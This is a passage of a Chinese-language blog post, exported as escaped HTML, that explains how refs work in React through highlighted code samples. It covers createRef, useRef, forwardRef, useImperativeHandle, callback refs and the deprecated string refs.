不能正常运行</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">MyFunctionComponent</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> /&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Parent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">props</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(props);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.textInput = React.createRef();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;MyFunctionComponent ref=&#123;<span class=\"built_in\">this</span>.textInput&#125; /&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果要在函数组件中使用 ref，可以使用 React.forwardRef（可与 useImperativeHandle 结合使用）</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 可以正常运行</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">MyFunctionComponent</span>(<span class=\"params\">props, ref</span>) </span>&#123;</span><br><span class=\"line\">  React.useImperativeHandle(ref, <span class=\"function\">() =&gt;</span> (&#123;</span><br><span class=\"line\">    onCheck,</span><br><span class=\"line\">  &#125;));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> onCheck = <span class=\"function\">() =&gt;</span> &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> /&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> NewMyFunctionComponent = React.forwardRef(MyFunctionComponent)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Parent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">props</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(props);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.textInput = React.createRef();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;MyFunctionComponent ref=&#123;<span class=\"built_in\">this</span>.textInput&#125; /&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>总之，在函数组件内部使用 ref 属性，只能指向一个 DOM 元素或 class 组件</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CustomTextInput</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 这里必须声明 textInput，这样 ref 才可以引用它</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> textInput = useRef(<span class=\"literal\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handleClick</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    textInput.current.focus();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;div&gt;</span><br><span class=\"line\">      &lt;input</span><br><span class=\"line\">        type=<span class=\"string\">&quot;text&quot;</span></span><br><span class=\"line\">        ref=&#123;textInput&#125; /&gt;</span><br><span class=\"line\">      &lt;input</span><br><span class=\"line\">        type=<span class=\"string\">&quot;button&quot;</span></span><br><span class=\"line\">        value=<span class=\"string\">&quot;Focus the text input&quot;</span></span><br><span class=\"line\">        onClick=&#123;handleClick&#125;</span><br><span class=\"line\">      /&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"3-React-forwardRef\"><a href=\"#3-React-forwardRef\" class=\"headerlink\" title=\"3. React.forwardRef()\"></a>3. React.forwardRef()</h3><p><code>React.forwardRef</code> 主要用于穿过父元素直接获取子元素的 ref。HOC（higher-order component）在 ref 使用上会存在问题，HOC 的 ref 是无法通过 props 进行传递的，因此无法直接获取被包裹组件（WrappedComponent），所以需要进行中转。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">HOCProps</span>(<span class=\"params\">WrappedComponent</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HOCComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">props</span>)</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">super</span>(props);</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.setWrappedInstance = <span class=\"built_in\">this</span>.setWrappedInstance.bind(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">getWrappedInstance</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.wrappedInstance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 实现 ref 的访问</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">setWrappedInstance</span>(<span class=\"params\">ref</span>)</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.wrappedInstance = ref;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">WrappedComponent</span> <span class=\"attr\">ref</span>=<span class=\"string\">&#123;this.setWrappedInstance&#125;</span> &#123;<span class=\"attr\">...this.props</span>&#125; /&gt;</span></span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> HOCComponent;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> App = HOCProps(Wrap);</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;App ref=&#123;<span class=\"function\">(<span class=\"params\">dom</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(dom); <span class=\"comment\">// 只能获取到 HOCComponent</span></span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(dom.getWrappedInstance()); <span class=\"comment\">// 通过中转后可以获取到 WrappedComponent</span></span><br><span class=\"line\">&#125;&#125; /&gt;</span><br></pre></td></tr></table></figure>\n\n<p>利用 forwardRef 能直接穿透 HOCComponent 获取到 WrappedComponent</p>\n<blockquote>\n<p>React.forwardRef 的原理其实非常简单，forwardRef 会生成 react 内部一种较为特殊的 Component。当进行创建更新操作时，会将 forwardRef 组件上的 props 与 ref 直接传递给提前注入的 render 函数，来生成 children。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">HOCProps</span>(<span class=\"params\">WrappedComponent</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HOCComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> &#123; forwardedRef, ...rest &#125; = <span class=\"built_in\">this</span>.props;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">WrappedComponent</span> <span class=\"attr\">ref</span>=<span class=\"string\">&#123;forwardedRef&#125;</span> &#123;<span class=\"attr\">...rest</span>&#125; /&gt;</span></span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> React.forwardRef(<span class=\"function\">(<span class=\"params\">props, ref</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">HOCComponent</span> <span class=\"attr\">forwardedRef</span>=<span class=\"string\">&#123;ref&#125;</span> &#123;<span class=\"attr\">...props</span>&#125;  /&gt;</span></span>;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> App = HOCProps(Wrap);</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;App ref=&#123;<span class=\"function\">(<span class=\"params\">dom</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 可以直接获取 WrappedComponent</span></span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(dom);</span><br><span class=\"line\">&#125;&#125; /&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-React-useImperativeHandle\"><a href=\"#4-React-useImperativeHandle\" class=\"headerlink\" title=\"4. React.useImperativeHandle()\"></a>4. React.useImperativeHandle()</h3><p><code>useImperativeHandle(ref, createHandle, [deps])</code></p>\n<p><code>useImperativeHandle</code> 可以让你在使用 <code>ref</code> 时自定义暴露给父组件的实例值。<code>useImperativeHandle</code> 应当与 <code>forwardRef</code> 一起使用.</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">FancyInput</span>(<span class=\"params\">props, ref</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> inputRef = useRef();</span><br><span class=\"line\"></span><br><span class=\"line\">  useImperativeHandle(ref, <span class=\"function\">() =&gt;</span> (&#123;</span><br><span class=\"line\">    focus: <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      inputRef.current.focus();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">ref</span>=<span class=\"string\">&#123;inputRef&#125;</span> /&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">FancyInput = forwardRef(FancyInput);</span><br></pre></td></tr></table></figure>\n\n<p>在本例中，渲染 <code>&lt;FancyInput ref=&#123;inputRef&#125; /&gt;</code> 的父组件可以调用 <code>inputRef.current.focus()</code>。</p>\n<h3 id=\"5-callback-ref\"><a href=\"#5-callback-ref\" class=\"headerlink\" title=\"5. callback ref\"></a>5. callback ref</h3><p>当 ref 属性接收一个回调函数时，会将其对应的 DOM元素 或 class 组件实例作为回调函数的参数调用回调函数。因此我们可以通过回调 Refs 的方式不依靠 Ref 对象，更灵活地控制要访问的元素或实例</p>\n<blockquote>\n<p>callback ref 采用了组件 render 过程中在闭包函数中分配 ref 的模式，通常会使用内联函数的形式，那么每次渲染都会重新创建，由于 react 会清理旧的 ref 然后设置新的，因此更新期间会调用两次，第一次为 null，如果在 callback 中带有业务逻辑的话，可能会出错，当然可以通过将 callback 定义成类成员函数并进行绑定的方式避免。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">componentDidMount</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.myRef.focus();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">ref</span>=<span class=\"string\">&#123;(ele)</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"xml\">      this.myRef = ele;</span></span><br><span class=\"line\"><span class=\"xml\">    &#125;&#125; /&gt;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-string-ref-不再建议使用\"><a href=\"#6-string-ref-不再建议使用\" class=\"headerlink\" title=\"6. string ref (不再建议使用)\"></a>6. string ref (不再建议使用)</h3><p>React 官方文档直接提出 <code>string ref</code> 将会在未来版本被移出，建议用户使用 <code>callback ref</code> 来代替</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// string ref</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">componentDidMount</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.refs.myRef.focus();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">ref</span>=<span class=\"string\">&quot;myRef&quot;</span> /&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>string ref</code> 存在以下问题：</p>\n<ol>\n<li>存在性能问题：当 ref 定义为 string 时，需要 React 追踪当前正在渲染的组件，在 reconciliation 阶段，React Element 创建和更新的过程中，ref 会被封装为一个闭包函数，等待 commit 阶段被执行，这会对 React 的性能产生一些影响。</li>\n<li>使用 string ref 会造成 ref 挂载位置产生歧义</li>\n<li>string ref 无法被组合，例如一个第三方库的父组件已经给子组件传递了 ref，那么我们就无法再在子组件上添加 ref 了，而 callback ref 可完美解决此问题</li>\n<li>在根组件上使用无法生效</li>\n<li>对于静态类型较不友好，当使用 string ref 时，必须显式声明 refs 的类型，无法完成自动推导。</li>\n<li>编译器无法将 string ref 与其 refs 上对应的属性进行混淆，而使用 callback ref，可被混淆。</li>\n</ol>\n<h3 id=\"7-总结\"><a href=\"#7-总结\" class=\"headerlink\" title=\"7. 总结\"></a>7. 总结</h3><p>在 class 内部通过 <code>React.createRef()</code> 创建 Refs 对象，在函数组件内部通过 <code>React.useRef()</code> 创建 Refs 对象，如果被引用的组件为函数组件，则需要通过 <code>React.forwardRef()</code> 和 <code>React.useImperativeHandler()</code> 来作处理。</p>\n<ul>\n<li>父组件为 class 组件，子组件为 class 组件 —- 父组件中直接使用 <code>React.createRef()</code> 引用子组件实例</li>\n<li>父组件为 class 组件，子组件为 函数组件 —- 父组件中 <code>React.createRef()</code>，子组件使用 <code>React.forwardRef()</code> 和 <code>React.useImperativeHandler()</code></li>\n<li>父组件为 函数组件，子组件为 class 组件 —- 父组件中直接使用 <code>React.useRef()</code> 引用子组件实例</li>\n<li>父组件为 函数组件，子组件为 函数组件 —- 父组件中 <code>React.useRef()</code>，子组件使用 <code>React.forwardRef()</code> 和 <code>React.useImperativeHandler()</code></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"React-中-ref-的使用\"><a href=\"#React-中-ref-的使用\" class=\"headerlink\" title=\"React 中 ref 的使用\"></a>React 中 ref 的使用</h1><p><strong><code>ref</code> 与 <code>Refs</code> 是两个不同的概念</strong></p>\n<ul>\n<li><code>ref</code> 是一个特殊的属性，可作用于 <code>DOM 元素</code>或 <code>React 元素</code>上，用于接收 HTML 元素或组件实例，作为其 current 属性</li>\n<li><code>Refs</code> 是 React 提供的可用特定 API 创建的一个对象，可以用 <code>React.creatRef()</code> 、<code>React.useRef()</code> 创建，生成的对象类似于 <code>&#123; current: null &#125;</code>，用于赋值给 <code>DOM 元素</code> 或 <code>React 元素</code> 上</li>\n</ul>\n<p><strong>适合使用 refs 的几种情况</strong></p>\n<ul>\n<li>管理焦点，文本选择或媒体播放</li>\n<li>触发强制动画</li>\n<li>集成第三方 DOM 库</li>\n</ul>\n<blockquote>\n<p>React 为提供了直接访问 <em>DOM元素</em> 和 <em>React 元素</em>的方式，就是通过 Refs。使用的方式很简单，就是为想要访问的元素上添加 <code>ref</code> 属性，将 <code>Refs</code> 对象附加到 <code>ref</code> 属性上，那么此时 <code>Refs</code> 对象的 <code>current</code> 属性就不再是空，而是对应的 <em>DOM元素</em> 或 <em>React 元素实例</em></p>\n</blockquote>\n<p><strong>React.createRef()</strong><br>使用 <code>React.createRef()</code> 的方式可以创建一个 <em>Ref 对象</em>，可通过附加到 ref 属性上访问一个 <em>原生DOM元素</em> 或者 <em>class 组件</em>。这种方式可以在<em>函数组件</em>和<em>class 组件</em>中使用。</p>\n<p><strong>React.useRef(initialValue)</strong><br><code>React.useRef()</code> 返回一个可变的 <em>Ref 对象</em>，其 <code>.current</code> 属性被初始化为传入的参数 <code>initialValue</code>。返回的 <code>Refs</code> 对象在组件的整个生命周期内保持不变。这种方式只能在<strong>函数组件</strong>中使用。</p>\n<blockquote>\n<p>ref 属性只能被添加到原生 DOM元素 或者 React的 class 组件上。不能在直接函数组件 上使用 ref 属性，因为函数组件没有实例。若想在函数组件上使用 ref 属性，可以通过 React.forwardRef 将 Ref 转发到函数组件内部</p>\n</blockquote>\n<p>当 ref 属性接收 Ref 对象时，会将其对应的 DOM元素 或者 class组件实例 直接赋值给 Ref 对象中的 current 属性上。而当 ref 属性接收一个回调函数时，会将其对应的 DOM元素 或 class组件实例作为回调函数的参数调用回调函数。</p>\n<h3 id=\"1-React-createRef\"><a href=\"#1-React-createRef\" class=\"headerlink\" title=\"1. React.createRef()\"></a>1. React.createRef()</h3><p><code>React.createRef</code> 主要用在 class 组件中，用于创建 Refs 对象，用来保存和引用一些值，并且修改这个属性不会触发组件更新。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">props</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(props);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.myRef = React.createRef();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">componentDidMount</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.myRef.current.focus();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">ref</span>=<span class=\"string\">&#123;this.myRef&#125;</span> /&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-React-useRef\"><a href=\"#2-React-useRef\" class=\"headerlink\" title=\"2. React.useRef()\"></a>2. React.useRef()</h3><p><code>React.useRef()</code> 作为 react hooks 的一种，主要用在函数组件中。</p>\n<p><code>React.useRef()</code> 返回一个可变的 <em>Ref 对象</em>，其 <code>.current</code> 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的<strong>整个生命周期内保持不变</strong>，所以可用于保存 <strong>React 组件</strong>、<strong>DOM 元素</strong>或<strong>普通 js 对象</strong>的值</p>\n<p>默认情况下，不能在函数组件上使用 ref 属性，因为函数组件没有示例，所以以下代码不能正常运行</p>\n<blockquote>\n<p>函数组件中 state 变化时，会重新创建、初始化所有的变量和表达式，故不能使用 <code>React.createRef()</code></p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 不能正常运行</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">MyFunctionComponent</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> /&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Parent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">props</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(props);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.textInput = React.createRef();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;MyFunctionComponent ref=&#123;<span class=\"built_in\">this</span>.textInput&#125; /&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果要在函数组件中使用 ref，可以使用 React.forwardRef（可与 useImperativeHandle 结合使用）</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 可以正常运行</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">MyFunctionComponent</span>(<span class=\"params\">props, ref</span>) </span>&#123;</span><br><span class=\"line\">  React.useImperativeHandle(ref, <span class=\"function\">() =&gt;</span> (&#123;</span><br><span class=\"line\">    onCheck,</span><br><span class=\"line\">  &#125;));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> onCheck = <span class=\"function\">() =&gt;</span> &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> /&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> NewMyFunctionComponent = React.forwardRef(MyFunctionComponent)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Parent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span 